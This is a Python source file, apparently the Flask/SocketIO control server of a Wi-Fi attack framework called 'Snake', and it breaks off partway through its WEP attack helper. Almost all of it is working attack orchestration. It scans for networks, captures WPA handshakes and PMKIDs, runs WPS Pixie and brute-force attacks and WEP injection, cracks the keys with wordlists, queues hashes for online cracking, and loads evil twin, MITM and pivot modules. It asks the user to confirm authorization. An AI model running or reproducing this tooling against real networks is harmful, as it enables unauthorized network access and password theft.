#!/usr/bin/env python3
"""
Snake Framework - Flask/SocketIO Server
Main control panel server with real-time WebSocket updates.
"""
import os
import sys
import json
import time
import threading
import subprocess
import atexit
import glob
import re
import secrets
import signal
from pathlib import Path
from functools import wraps
from typing import Optional

from flask import Flask, render_template, request, jsonify, send_from_directory, send_file
from flask_socketio import SocketIO, emit
from flask_cors import CORS

# ── Path setup ───────────────────────────────────────────────────────────────
SNAKE_DIR  = Path(__file__).resolve().parent.parent   # snakefw/
BASE_DIR   = SNAKE_DIR.parent                          # wifite2/
sys.path.insert(0, str(BASE_DIR))

from dotenv import load_dotenv
load_dotenv(BASE_DIR / ".env")

from snakefw.core.session_manager import get_session, SessionState
from snakefw.core.tool_manager    import (
    check_tools, get_interfaces, get_interface_mode,
    set_monitor_mode, set_managed_mode, change_mac, get_wordlist,
    build_wifite_command, find_handshake_cap,
    normalize_bssid, is_valid_bssid, get_tools_detail,
    classify_wireless_ifaces,
    CrackEngine, ProcessRunner, RESULTS, LOGS, CAPTURES
)
from snakefw.core.cracked_store import load_all_cracked
from snakefw.core.online_crack import (
    check_results,
    download_path,
    enqueue_failed,
    get_item,
    get_pref,
    list_queue,
    set_api_key,
    submit_item,
)
from snakefw.core.wordlists import (
    build_tiered_wordlists,
    list_wordlists,
    resolve_wordlist,
    set_active_wordlist,
)
from snakefw.core.scanner         import Scanner
from snakefw.core.network_analyzer import NetworkAnalyzer
from snakefw.mitm.routes           import mitm_bp, register_socketio as mitm_register, stop_all_mitm
from snakefw.rf.routes             import rf_bp, register_socketio as rf_register, stop_rf_job
from snakefw.rf.engine             import stop_all_rf
from snakefw.eviltwin.routes       import twin_bp, register_socketio as twin_register, active_twin_ifaces
from snakefw.eviltwin.engine       import stop_all_twin
from snakefw.strike.routes         import strike_bp, register_socketio as strike_register, stop_all_strike
from snakefw.pivot.routes          import pivot_bp, register_socketio as pivot_register, emit_pivot_ready
from snakefw.pivot.engine          import stop_all_pivot
from snakefw.report.routes         import report_bp
from snakefw.arsenal.routes        import arsenal_bp, register_socketio as arsenal_register
from snakefw.agent.routes          import agent_bp
from snakefw.core.agent_bridge     import init_agent_bridge
from snakefw.core.radios           import assign_roles
from snakefw.core.paths import (
    CAPTURES_DIR,
    LOGS_DIR,
    RESULTS_DIR,
    WORDLISTS_DIR,
)

# ── App setup ────────────────────────────────────────────────────────────────
app = Flask(
    __name__,
    template_folder=str(SNAKE_DIR / "templates"),
    static_folder=str(SNAKE_DIR / "static"),
    static_url_path="/static",
)
app.config["SECRET_KEY"] = os.environ.get("SNAKE_SECRET_KEY") or secrets.token_hex(32)
allowed_origins = [
    origin.strip()
    for origin in os.environ.get("SNAKE_ALLOWED_ORIGINS", "").split(",")
    if origin.strip()
]
if allowed_origins:
    CORS(app, origins=allowed_origins)
socketio = SocketIO(
    app,
    cors_allowed_origins=allowed_origins or None,
    async_mode="threading",
    ping_timeout=60,
    ping_interval=25,
)

# ── Global state ─────────────────────────────────────────────────────────────
session     = get_session()
analyzer    = NetworkAnalyzer()
_scanner:   Scanner = None
_scan_token = 0
_attack_threads: dict = {}
_job_runners: dict = {}
_job_processes: dict = {}
_job_stop_events: dict = {}

# ── Register feature blueprints ───────────────────────────────────────────────
app.register_blueprint(mitm_bp)
app.register_blueprint(rf_bp)
app.register_blueprint(twin_bp)
app.register_blueprint(strike_bp)
app.register_blueprint(pivot_bp)
app.register_blueprint(report_bp)
app.register_blueprint(agent_bp)
app.register_blueprint(arsenal_bp)

def snake_log(msg: str, level: str = "INFO"):
    session.log(msg, level)
    socketio.emit("log", {"ts": time.time(), "level": level, "msg": msg})


def require_interface(f):
    @wraps(f)
    def wrapper(*args, **kwargs):
        if not session.interface and not session.monitor_iface:
            return jsonify({"ok": False, "error": "No interface selected"}), 400
        return f(*args, **kwargs)
    return wrapper


def _validated_interface(value: str) -> str:
    value = (value or "").strip()
    if not re.fullmatch(r"[A-Za-z0-9_.:-]{1,32}", value):
        raise ValueError("Invalid interface name")
    if value not in get_interfaces():
        raise ValueError(f"Unknown wireless interface: {value}")
    return value


def _bounded_int(value, default: int, minimum: int, maximum: int) -> int:
    try:
        parsed = int(value)
    except (TypeError, ValueError):
        parsed = default
    return max(minimum, min(maximum, parsed))


def _health_snapshot() -> dict:
    tools = check_tools()
    interfaces = [
        {"name": iface, "mode": get_interface_mode(iface)}
        for iface in get_interfaces()
    ]
    catalog = list_wordlists()
    wordlists = catalog["wordlists"]
    directories = {
        str(path): os.access(path, os.W_OK)
        for path in (CAPTURES_DIR, RESULTS_DIR, WORDLISTS_DIR, LOGS_DIR)
    }
    detail = get_tools_detail()
    return {
        "ok": not detail["required_missing"],
        "root": os.geteuid() == 0,
        "tools": tools,
        "tool_entries": detail["entries"],
        "required_missing": detail["required_missing"],
        "optional_missing": detail["optional_missing"],
        "interfaces": interfaces,
        "wordlists": wordlists,
        "active_wordlist": catalog["active"] or get_wordlist(),
        "active_wordlist_tier": catalog["active_tier"],
        "directories": directories,
        "radios": assign_roles(
            classify_wireless_ifaces(),
            session_monitor=session.monitor_iface,
            preferred_scan=session.scan_iface or session.interface,
        ),
    }


# ── REST Routes ──────────────────────────────────────────────────────────────
@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/status")
def api_status():
    snap = session.get_snapshot()
    snap["tools"]      = check_tools()
    snap["interfaces"] = get_interfaces()
    return jsonify(snap)


@app.route("/api/health")
def api_health():
    return jsonify(_health_snapshot())


@app.route("/api/wordlists")
def api_wordlists():
    catalog = list_wordlists()
    return jsonify({
        "ok": True,
        "wordlists": catalog["wordlists"],
        "active": catalog["active"],
        "active_tier": catalog["active_tier"],
        "built": catalog["built"],
    })


@app.route("/api/wordlists/select", methods=["POST"])
def api_wordlists_select():
    data = request.json or {}
    try:
        chosen = set_active_wordlist(
            tier=str(data.get("tier") or ""),
            path=str(data.get("path") or ""),
        )
    except ValueError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400
    snake_log(f"[📖] Wordlist set to {chosen['label']}: {chosen['path']}", "INFO")
    return jsonify({"ok": True, **chosen})


@app.route("/api/wordlists/build", methods=["POST"])
def api_wordlists_build():
    if getattr(api_wordlists_build, "_running", False):
        return jsonify({"ok": False, "error": "A wordlist rebuild is already running"}), 429

    def _run():
        api_wordlists_build._running = True
        try:
            snake_log("[📖] Rebuilding Fast/Smart/Deep wordlists from SecLists...", "INFO")
            built = build_tiered_wordlists()
            set_active_wordlist(tier="smart")
            for tier, info in built.items():
                snake_log(f"[📖] {tier}: {info['count']} keys", "SUCCESS")
            snake_log("[📖] Wordlists rebuilt. Active: Smart", "SUCCESS")
        except Exception as exc:
            snake_log(f"[!] Wordlist rebuild failed: {exc}", "ERROR")
        finally:
            api_wordlists_build._running = False

    api_wordlists_build._running = True
    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"ok": True, "msg": "Rebuild started. Watch Console for counts."})


@app.route("/api/interfaces")
def api_interfaces():
    ifaces = get_interfaces()
    result = []
    for i in ifaces:
        result.append({"name": i, "mode": get_interface_mode(i)})
    return jsonify({"interfaces": result})


@app.route("/api/radios")
def api_radios():
    plan = _radio_plan()
    return jsonify({"ok": True, "radios": plan})


@app.route("/api/interface/select", methods=["POST"])
def api_select_interface():
    data  = request.json or {}
    iface = data.get("interface", "")
    try:
        iface = _validated_interface(iface)
    except ValueError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400
    session.interface = iface
    mode = get_interface_mode(iface)
    session.log(f"Interface selected: {iface} ({mode})")
    snake_log(f"[*] Interface set: {iface} (mode={mode})")
    return jsonify({"ok": True, "interface": iface, "mode": mode})


def _stop_active_scanner(reason: str = "stopped") -> bool:
    """Stop the live scanner and invalidate leftover duration timers."""
    global _scanner, _scan_token
    _scan_token += 1
    running = bool(_scanner and _scanner._running)
    if _scanner:
        _scanner.stop()
        _scanner = None
    if session.state == SessionState.SCANNING:
        session.set_state(SessionState.IDLE)
    if running:
        socketio.emit("scan_stopped", {"reason": reason})
    return running


def _existing_monitor_iface() -> str:
    seen = []
    for name in (session.monitor_iface, session.interface):
        if name and name not in seen:
            seen.append(name)
    for name in seen:
        if name in get_interfaces() and get_interface_mode(name) == "monitor":
            return name
    for name in get_interfaces():
        if get_interface_mode(name) == "monitor":
            return name
    return ""


def _radio_plan() -> dict:
    return assign_roles(
        classify_wireless_ifaces(),
        session_monitor=session.monitor_iface,
        preferred_scan=session.scan_iface or session.interface,
    )


def _remember_radio_roles(scan_iface: str = "") -> None:
    plan = _radio_plan()
    session.scan_iface = scan_iface or plan.get("scan_iface") or session.monitor_iface
    attack = plan.get("attack_iface") or ""
    if attack and get_interface_mode(attack) == "monitor":
        session.attack_iface = attack
    else:
        session.attack_iface = session.scan_iface


def _ensure_scan_interface() -> str:
    """Use a live monitor interface, enabling monitor mode when needed."""
    plan = _radio_plan()
    preferred = plan.get("scan_iface") or ""
    if preferred and preferred in get_interfaces() and get_interface_mode(preferred) == "monitor":
        session.monitor_iface = preferred
        session.interface = preferred
        _remember_radio_roles(preferred)
        return preferred
    mon = _existing_monitor_iface()
    if mon:
        session.monitor_iface = mon
        session.interface = mon
        _remember_radio_roles(mon)
        return mon
    iface = session.interface or session.monitor_iface
    if not iface:
        raise ValueError("No interface selected")
    snake_log(f"[*] {iface} is not in monitor mode; enabling before scan")
    mon = set_monitor_mode(iface, callback=snake_log)
    session.monitor_iface = mon
    session.interface = mon
    _remember_radio_roles(mon)
    socketio.emit("interface_update", _iface_payload(mon, "monitor"))
    snake_log(f"[+] Monitor mode: {mon}", "SUCCESS")
    return mon


def _request_interface() -> str:
    data = request.json or {}
    requested = (data.get("interface") or "").strip()
    if requested:
        iface = _validated_interface(requested)
        session.interface = iface
        return iface
    iface = session.monitor_iface or session.interface
    if not iface:
        raise ValueError("No interface selected")
    return iface


def _iface_payload(iface: str, mode: str) -> dict:
    return {
        "ok": True,
        "interface": iface,
        "mode": mode,
        "interfaces": [
            {"name": name, "mode": get_interface_mode(name)}
            for name in get_interfaces()
        ],
    }


@app.route("/api/interface/monitor", methods=["POST"])
def api_enable_monitor():
    _stop_active_scanner(reason="interface")
    try:
        iface = _request_interface()
        mon = set_monitor_mode(iface, callback=snake_log)
    except ValueError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400
    except Exception as exc:
        snake_log(f"[!] Monitor mode failed: {exc}", "ERROR")
        return jsonify({"ok": False, "error": str(exc)}), 500
    session.monitor_iface = mon
    session.interface = mon
    _remember_radio_roles(mon)
    payload = _iface_payload(mon, "monitor")
    socketio.emit("interface_update", payload)
    return jsonify(payload)


@app.route("/api/interface/managed", methods=["POST"])
def api_enable_managed():
    _stop_active_scanner(reason="interface")
    try:
        iface = _request_interface()
        managed = set_managed_mode(iface, callback=snake_log)
    except ValueError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400
    except Exception as exc:
        snake_log(f"[!] Managed mode failed: {exc}", "ERROR")
        return jsonify({"ok": False, "error": str(exc)}), 500
    session.interface = managed
    session.monitor_iface = ""
    session.scan_iface = ""
    session.attack_iface = ""
    payload = _iface_payload(managed, "managed")
    socketio.emit("interface_update", payload)
    return jsonify(payload)


@app.route("/api/scan/start", methods=["POST"])
@require_interface
def api_scan_start():
    global _scanner, _scan_token
    data = request.json or {}

    if _scanner and _scanner._running:
        return jsonify({"ok": False, "error": "Scan already running"})

    channel = _bounded_int(data.get("channel"), 0, 0, 196)
    band = data.get("band", "bg")
    if band not in {"a", "bg", "abg"}:
        return jsonify({"ok": False, "error": "Invalid band"}), 400
    duration = _bounded_int(data.get("duration"), 0, 0, 600)

    try:
        iface = _ensure_scan_interface()
    except ValueError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400
    except Exception as exc:
        session.set_state(SessionState.ERROR)
        snake_log(f"[!] Cannot enable monitor mode for scan: {exc}", "ERROR")
        return jsonify({"ok": False, "error": str(exc)}), 500

    _scan_token += 1
    token = _scan_token
    if _scanner:
        _scanner.stop()
        _scanner = None

    session.set_state(SessionState.SCANNING)
    session.stats["scans"] = session.stats.get("scans", 0) + 1
    snake_log(f"[🐍] Starting scan on {iface}...", "INFO")

    def _network_cb(msg):
        if msg == "__networks_updated__":
            nets = _scanner.get_networks() if _scanner else []
            session.update_networks(nets)
            socketio.emit("networks_update", {"networks": nets})
        elif msg == "__scanner_exited__":
            _stop_active_scanner("error")
        else:
            snake_log(msg)

    _scanner = Scanner(iface, callback=_network_cb, channel=channel, band=band)
    try:
        _scanner.start()
    except Exception as exc:
        _scanner = None
        session.set_state(SessionState.ERROR)
        snake_log(f"[!] Scanner failed: {exc}", "ERROR")
        return jsonify({"ok": False, "error": str(exc)}), 500

    if duration:
        def _stop_after_duration():
            time.sleep(duration)
            if token != _scan_token:
                return
            if _stop_active_scanner("duration"):
                snake_log(f"[*] Scan preset completed after {duration}s")

        threading.Thread(target=_stop_after_duration, daemon=True).start()

    return jsonify({"ok": True, "msg": f"Scanning on {iface}", "duration": duration})


@app.route("/api/scan/stop", methods=["POST"])
def api_scan_stop():
    _stop_active_scanner(reason="stopped")
    snake_log("[*] Scan stopped.")
    return jsonify({"ok": True})


@app.route("/api/networks")
def api_networks():
    return jsonify({"networks": session.networks})


@app.route("/api/attack", methods=["POST"])
@require_interface
def api_attack():
    data = request.json or {}
    try:
        target = _validated_attack_request(data)
    except ValueError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400

    if data.get("dry_run"):
        return jsonify({
            "ok": True,
            "dry_run": True,
            "target": target,
            "requirements": _attack_requirements(target["attack"]),
        })
    if data.get("authorized") is not True:
        return jsonify({
            "ok": False,
            "error": "Confirm you are authorized to test this target",
        }), 400

    jid = _launch_attack_job(**target)
    return jsonify({"ok": True, "job_id": jid})


def _lookup_scanned_network(
    bssid: str = "",
    essid: str = "",
    network_index: Optional[int] = None,
) -> Optional[dict]:
    """Resolve a target from the latest scan results."""
    networks = session.networks
    if network_index is not None:
        try:
            idx = int(network_index)
        except (TypeError, ValueError):
            idx = -1
        if 0 <= idx < len(networks):
            return networks[idx]
    if bssid and is_valid_bssid(bssid):
        wanted = normalize_bssid(bssid)
        for network in networks:
            if normalize_bssid(network.get("bssid", "")) == wanted:
                return network
    essid = (essid or "").strip()
    if essid:
        for network in networks:
            if network.get("essid", "").strip().lower() == essid.lower():
                return network
    return None


def _validated_attack_request(data: dict) -> dict:
    bssid = normalize_bssid(str(data.get("bssid", "")))
    essid = str(data.get("essid", "")).strip()[:128]
    attack = data.get("attack", "WPA_HANDSHAKE")
    valid_attacks = {"WPA_HANDSHAKE", "WPA_PMKID", "WPS_PIXIE", "WPS_BRUTEFORCE", "WEP"}
    if attack not in valid_attacks:
        raise ValueError(f"Unsupported attack type: {attack}")

    network = None
    if not is_valid_bssid(bssid):
        network = _lookup_scanned_network(
            bssid=bssid,
            essid=essid,
            network_index=data.get("network_index"),
        )
        if network and is_valid_bssid(network.get("bssid", "")):
            bssid = normalize_bssid(network["bssid"])
            if not essid:
                essid = str(network.get("essid", ""))[:128]
        else:
            raise ValueError(
                "A valid BSSID is required. Select a network from the scanner "
                "or run a scan so Snake can fill it automatically."
            )
    elif not essid:
        network = _lookup_scanned_network(bssid=bssid)
        if network:
            essid = str(network.get("essid", ""))[:128]

    channel = _bounded_int(data.get("channel"), 0, 0, 196)
    if channel < 1:
        if network is None:
            network = _lookup_scanned_network(bssid=bssid, essid=essid)
        if network:
            channel = _bounded_int(network.get("channel"), 6, 1, 196)
        else:
            channel = 6

    if network and network.get("attack_vector") == "NONE" and attack != "WEP":
        if "OPN" in str(network.get("encryption", "")).upper():
            raise ValueError("Open networks have no WPA/WPS attack vector")

    wordlist = ""
    requested = str(data.get("wordlist") or data.get("wordlist_tier") or "").strip()
    if requested:
        chosen = resolve_wordlist(tier=requested, path=requested)
        if not chosen:
            chosen = resolve_wordlist(tier=requested)
        if not chosen:
            raise ValueError("Unknown or missing wordlist")
        wordlist = chosen["path"]

    return {
        "bssid": bssid,
        "essid": essid,
        "attack": attack,
        "channel": channel,
        "wordlist": wordlist,
    }


def _attack_requirements(attack: str) -> list:
    return {
        "WPA_HANDSHAKE": ["wifite", "aircrack-ng"],
        "WPA_PMKID": ["hcxdumptool", "hcxpcapngtool", "hashcat"],
        "WPS_PIXIE": ["reaver"],
        "WPS_BRUTEFORCE": ["reaver"],
        "WEP": ["airodump-ng", "aireplay-ng", "aircrack-ng"],
    }.get(attack, [])


def _launch_attack_job(bssid: str, essid: str, attack: str, channel: int, wordlist: str = "") -> str:
    jid = session.add_job(essid, bssid, attack)
    session.set_state(SessionState.ATTACKING)
    _job_stop_events[jid] = threading.Event()
    snake_log(f"[⚔️] Job {jid}: {attack} on {essid} ({bssid})", "ATTACK")
    thread = threading.Thread(
        target=_execute_attack,
        args=(jid, bssid, essid, attack, channel, wordlist),
        daemon=True,
    )
    _attack_threads[jid] = thread
    thread.start()
    return jid


def _execute_attack(jid: str, bssid: str, essid: str, attack: str, channel: int, wordlist: str = ""):
    try:
        missing = [
            tool for tool in _attack_requirements(attack)
            if not check_tools().get(tool, False)
        ]
        if missing:
            raise RuntimeError(f"Missing required tools: {', '.join(missing)}")
        iface = session.attack_iface or session.monitor_iface or session.interface
        if session.attack_iface and get_interface_mode(session.attack_iface) == "monitor":
            iface = session.attack_iface
        engine = CrackEngine(callback=lambda message: (
            session.job_log(jid, message), snake_log(message)
        ), runner_callback=lambda runner: _job_runners.__setitem__(jid, runner),
           wordlist=wordlist,
           should_stop=lambda: _job_stop_events.get(jid) and _job_stop_events[jid].is_set())
        session.update_job(jid, state="RUNNING")
        socketio.emit("job_update", session.jobs[jid].to_dict())

        key = None
        capture = ""
        hash_file = ""
        if attack == "WPA_HANDSHAKE":
            capture = _run_wifite_capture(iface, bssid, essid, channel, jid)
            if capture and not _job_stop_events[jid].is_set():
                session.update_job(jid, capture=capture)
                key = engine.crack_offline(capture, bssid, essid, kind="handshake")
                hash_file = str(CAPTURES / Path(capture).stem) + ".hc22000"
                if not Path(hash_file).is_file():
                    converted = engine.convert_cap_to_hc22000(capture)
                    hash_file = converted or ""
        elif attack == "WPA_PMKID":
            capture = _run_pmkid_capture(iface, bssid, essid, channel, jid)
            if capture and not _job_stop_events[jid].is_set():
                session.update_job(jid, capture=capture, hash_file=capture)
                key = engine.crack_offline(capture, bssid, essid, kind="pmkid")
                hash_file = capture
        elif attack in ("WPS_PIXIE", "WPS_BRUTEFORCE"):
            key = engine.crack_wps(
                iface, bssid, essid,
                pixie=attack == "WPS_PIXIE",
                channel=channel,
            )
        elif attack == "WEP":
            key = _run_wep_attack(iface, bssid, essid, channel, jid, engine)

        if _job_stop_events[jid].is_set():
            session.update_job(jid, state="KILLED", ended_at=time.time())
        elif key and str(key).strip():
            key = str(key).strip()
            session.update_job(
                jid, state="CRACKED", key=key, progress=100, ended_at=time.time()
            )
            session.add_cracked({
                "essid": essid, "bssid": bssid, "key": key,
                "attack": attack, "date": int(time.time()),
            })
            snake_log(f"[🏆] CRACKED {essid}", "SUCCESS")
            socketio.emit("cracked", {"essid": essid, "bssid": bssid, "key": key})
            emit_pivot_ready({
                "essid": essid, "bssid": bssid, "key": key, "attack": attack,
            })
        else:
            queued = None
            if attack in {"WPA_HANDSHAKE", "WPA_PMKID"} and (capture or hash_file):
                queued = enqueue_failed(
                    essid, bssid,
                    cap_file=capture if attack == "WPA_HANDSHAKE" else "",
                    hash_file=hash_file,
                    lists_tried=getattr(engine, "lists_tried", []),
                )
            session.update_job(
                jid,
                state="FAILED",
                ended_at=time.time(),
                capture=capture or "",
                hash_file=hash_file or "",
                online_id=(queued or {}).get("id") or "",
            )
            if queued:
                snake_log(
                    f"[☁] Local lists missed {essid}. Saved for online crack "
                    f"(queue {queued['id']})",
                    "WARN",
                )
                socketio.emit("online_queued", queued)
            else:
                snake_log(f"[✗] Failed: {essid}", "ERROR")
    except Exception as exc:
        session.update_job(jid, state="ERROR", ended_at=time.time())
        snake_log(f"[!] Attack error: {exc}", "ERROR")
    finally:
        socketio.emit("job_update", session.jobs[jid].to_dict())
        _job_runners.pop(jid, None)
        _job_processes.pop(jid, None)
        if not any(job.state in ("RUNNING", "QUEUED") for job in session.jobs.values()):
            session.set_state(SessionState.IDLE)


@app.route("/api/attack/auto", methods=["POST"])
@require_interface
def api_auto_attack():
    """Run recommended actions sequentially for explicitly selected easy targets."""
    data = request.json or {}
    if data.get("authorized") is not True:
        return jsonify({
            "ok": False,
            "error": "Confirm authorization before starting automated actions",
        }), 400
    requested = set(data.get("bssids") or [])
    if not requested:
        return jsonify({
            "ok": False,
            "error": "Select at least one discovered target",
        }), 400
    selected = [
        network for network in session.networks
        if normalize_bssid(network.get("bssid", "")) in {
            normalize_bssid(item) for item in requested if item
        }
        and is_valid_bssid(network.get("bssid", ""))
        and network.get("attack_vector") != "NONE"
    ]
    if not selected:
        return jsonify({
            "ok": False,
            "error": "No selected scan targets are available. Run a scan and check targets in the Scanner tab.",
        }), 400

    jobs = []
    queued = []
    for network in selected[:5]:
        attack = network.get("attack_vector", "WPA_HANDSHAKE")
        jid = session.add_job(network["essid"], network["bssid"], attack)
        _job_stop_events[jid] = threading.Event()
        jobs.append(jid)
        queued.append((jid, network["bssid"], network["essid"], attack, network["channel"]))
        snake_log(
            f"[🤖] Auto-queued: {network['essid']} ({network['bssid']})",
            "AUTO",
        )

    def _run_queue():
        for args in queued:
            if _job_stop_events[args[0]].is_set():
                session.update_job(args[0], state="KILLED", ended_at=time.time())
                continue
            _execute_attack(*args)

    coordinator = threading.Thread(target=_run_queue, daemon=True)
    for jid in jobs:
        _attack_threads[jid] = coordinator
    coordinator.start()

    return jsonify({"ok": True, "jobs": jobs, "count": len(jobs)})


@app.route("/api/wifite/run", methods=["POST"])
@require_interface
def api_wifite_run():
    """Launch wifite2 with full automation."""
    data = request.json or {}
    if data.get("authorized") is not True:
        return jsonify({"ok": False, "error": "Confirm authorization first"}), 400
    iface = session.monitor_iface or session.interface
    timeout = _bounded_int(data.get("timeout"), 300, 30, 3600)
    wl = data.get("wordlist", "")

    wifite_path = str(BASE_DIR / "Wifite.py")
    cmd = build_wifite_command(
        wifite_path,
        iface,
        wordlist=wl,
        wpa=True,
        no_wps=True,
        kill=True,
    )

    jid = session.add_job("ALL", "ALL", "WIFITE_AUTO")
    snake_log(f"[🐍] Launching wifite2 via Snake (job {jid})...", "INFO")

    def _run():
        log_file = str(LOGS / f"wifite_{jid}.log")
        runner = ProcessRunner(
            cmd, log_file=log_file,
            callback=lambda m: (session.job_log(jid, m), snake_log(m)),
            timeout=timeout
        ).start()
        _job_runners[jid] = runner
        session.update_job(jid, state="RUNNING")
        runner.wait()
        state = "KILLED" if _job_stop_events[jid].is_set() else (
            "DONE" if runner.returncode == 0 else "FAILED"
        )
        session.update_job(jid, state=state, ended_at=time.time())
        # Re-load cracked results
        session._load_cracked()
        socketio.emit("cracked_update", {"cracked": session.cracked})
        socketio.emit("job_update", session.jobs[jid].to_dict())
        _job_runners.pop(jid, None)

    _job_stop_events[jid] = threading.Event()
    threading.Thread(target=_run, daemon=True).start()
    return jsonify({"ok": True, "job_id": jid})


@app.route("/api/cracked")
def api_cracked():
    session.cracked = load_all_cracked()
    session.stats["cracked"] = len(session.cracked)
    return jsonify({"cracked": session.cracked, "count": len(session.cracked)})


@app.route("/api/online-queue")
def api_online_queue():
    pref = get_pref()
    return jsonify({
        "ok": True,
        "items": list_queue(),
        "has_api_key": bool(str(pref.get("api_key") or "").strip()),
        "provider": "wpa-sec",
        "provider_url": "https://wpa-sec.stanev.org",
    })


@app.route("/api/online-queue/key", methods=["POST"])
def api_online_queue_key():
    data = request.json or {}
    pref = set_api_key(str(data.get("api_key") or ""))
    return jsonify({"ok": True, "has_api_key": bool(pref.get("api_key"))})


@app.route("/api/online-queue/<item_id>/submit", methods=["POST"])
def api_online_queue_submit(item_id):
    data = request.json or {}
    if data.get("authorized") is not True:
        return jsonify({
            "ok": False,
            "error": "Confirm authorization before uploading a hash off-box",
        }), 400
    try:
        item = submit_item(item_id)
    except (ValueError, FileNotFoundError) as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400
    except Exception as exc:
        return jsonify({"ok": False, "error": str(exc)}), 502
    snake_log(f"[☁] Online submit {item_id}: {item.get('message')}", "INFO")
    socketio.emit("online_update", item)
    return jsonify({"ok": True, "item": item})


@app.route("/api/online-queue/check", methods=["POST"])
def api_online_queue_check():
    try:
        hits = check_results()
    except ValueError as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400
    except Exception as exc:
        return jsonify({"ok": False, "error": str(exc)}), 502
    if hits:
        session._load_cracked()
        for hit in hits:
            snake_log(f"[🏆] Online hit: {hit.get('essid')} → {hit.get('key')}", "SUCCESS")
            socketio.emit("cracked", {
                "essid": hit.get("essid"),
                "bssid": hit.get("bssid"),
                "key": hit.get("key"),
            })
        socketio.emit("cracked_update", {"cracked": session.cracked})
    socketio.emit("online_update", {"items": list_queue()})
    return jsonify({"ok": True, "hits": hits, "items": list_queue()})


@app.route("/api/online-queue/<item_id>/download")
def api_online_queue_download(item_id):
    path = download_path(item_id)
    if not path:
        return jsonify({"ok": False, "error": "No saved hash for that item"}), 404
    return send_file(path, as_attachment=True, download_name=path.name)


@app.route("/api/online-queue/from-job/<jid>", methods=["POST"])
def api_online_from_job(jid):
    data = request.json or {}
    if data.get("authorized") is not True:
        return jsonify({"ok": False, "error": "Confirm authorization first"}), 400
    job = session.jobs.get(jid)
    if not job:
        return jsonify({"ok": False, "error": "Unknown job"}), 404
    if job.online_id and get_item(job.online_id):
        return jsonify({"ok": True, "item": get_item(job.online_id)})
    item = enqueue_failed(
        job.essid, job.bssid,
        cap_file=job.capture,
        hash_file=job.hash_file,
    )
    if not item:
        return jsonify({"ok": False, "error": "Job has no saved handshake or hash"}), 400
    session.update_job(jid, online_id=item["id"])
    socketio.emit("online_queued", item)
    return jsonify({"ok": True, "item": item})


@app.route("/api/jobs")
def api_jobs():
    return jsonify({
        "jobs": {k: v.to_dict() for k, v in session.jobs.items()}
    })


@app.route("/api/jobs/history")
def api_job_history():
    return jsonify({"jobs": session.get_job_history()})


@app.route("/api/job/<jid>/kill", methods=["POST"])
def api_kill_job(jid):
    if jid not in session.jobs:
        return jsonify({"ok": False, "error": "Unknown job"}), 404
    stop_event = _job_stop_events.get(jid)
    if stop_event:
        stop_event.set()
    runner = _job_runners.get(jid)
    if runner:
        runner.kill()
    for process in _job_processes.get(jid, []):
        if process.poll() is None:
            try:
                os.killpg(process.pid, signal.SIGTERM)
            except (ProcessLookupError, PermissionError):
                process.terminate()
    stop_rf_job(jid)
    snake_log(f"[*] Kill requested for job {jid}", "WARN")
    session.update_job(jid, state="KILLED", ended_at=time.time())
    socketio.emit("job_update", session.jobs[jid].to_dict())
    return jsonify({"ok": True, "job_id": jid})


@app.route("/api/mac", methods=["POST"])
def api_mac():
    data = request.json or {}
    try:
        output = change_mac(data.get("interface", ""), data.get("mode", ""))
    except (ValueError, RuntimeError, subprocess.SubprocessError, OSError) as exc:
        return jsonify({"ok": False, "error": str(exc)}), 400
    snake_log(f"[+] MAC address updated on {data['interface']}", "SUCCESS")
    return jsonify({"ok": True, "output": output})


@app.route("/api/logs")
def api_logs():
    n = int(request.args.get("n", 200))
    return jsonify({"logs": session.get_recent_logs(n)})


@app.route("/api/tools")
def api_tools():
    return jsonify(get_tools_detail())


@app.route("/api/results/export")
def api_export():
    """Export all cracked passwords as JSON."""
    path = RESULTS / "cracked.json"
    if path.exists():
        return send_from_directory(str(RESULTS), "cracked.json",
                                   as_attachment=True)
    return jsonify({"cracked": session.cracked})


# ── Helper attack functions ──────────────────────────────────────────────────
def _run_wifite_capture(iface, bssid, essid, channel, jid) -> str:
    """Use wifite2 to capture handshake, return .cap path."""
    wifite_path = str(BASE_DIR / "Wifite.py")
    hs_dir = str(BASE_DIR / "hs")
    started = time.time()
    cmd = build_wifite_command(
        wifite_path,
        iface,
        bssid=bssid,
        essid=essid,
        channel=channel,
        wpa=True,
        no_wps=True,
        kill=True,
        no_crack=True,
    )
    log_file = str(LOGS / f"capture_{jid}.log")
    runner = ProcessRunner(
        cmd, log_file=log_file,
        callback=lambda m: (session.job_log(jid, m), snake_log(m)),
        timeout=120
    ).start()
    _job_runners[jid] = runner
    runner.wait()

    cap = find_handshake_cap(hs_dir, bssid, essid, min_mtime=started - 2)
    if not cap:
        cap = find_handshake_cap(hs_dir, bssid, essid, min_mtime=0)
        if cap:
            snake_log(
                f"[*] Reusing existing handshake for {essid} ({bssid}): {cap}",
                "INFO",
            )
        else:
            snake_log(
                f"[!] No handshake for {essid} ({bssid}) in {hs_dir}",
                "ERROR",
            )
    return cap


def _run_pmkid_capture(iface, bssid, essid, channel, jid) -> str:
    """Capture PMKID with hcxdumptool, return .hc22000 path."""
    out = str(CAPTURES / f"pmkid_{bssid.replace(':','-')}.pcapng")
    hc  = str(CAPTURES / f"pmkid_{bssid.replace(':','-')}.hc22000")
    cmd = [
        "hcxdumptool",
        "-i", iface,
        "--filterlist_ap", bssid,
        "--filtermode", "2",
        "-o", out,
        "--active_beacon",
        "--enable_status=1",
    ]
    log_file = str(LOGS / f"pmkid_{jid}.log")
    runner = ProcessRunner(cmd, log_file=log_file,
                           callback=lambda m: session.job_log(jid, m),
                           timeout=60).start()
    _job_runners[jid] = runner
    runner.wait(timeout=65)

    if not Path(out).exists():
        return None

    # Convert
    result = subprocess.run(
        ["hcxpcapngtool", "-o", hc, out],
        capture_output=True, text=True, timeout=30
    )
    return hc if Path(hc).exists() and Path(hc).stat().st_size > 0 else None


def _run_wep_attack(iface, bssid, essid, channel, jid, engine):
    """Full WEP crack: inject + aircrack."""
    # Switch to target channel
    subprocess.run(["iwconfig", iface, "channel", str(channel)], capture_output=True)
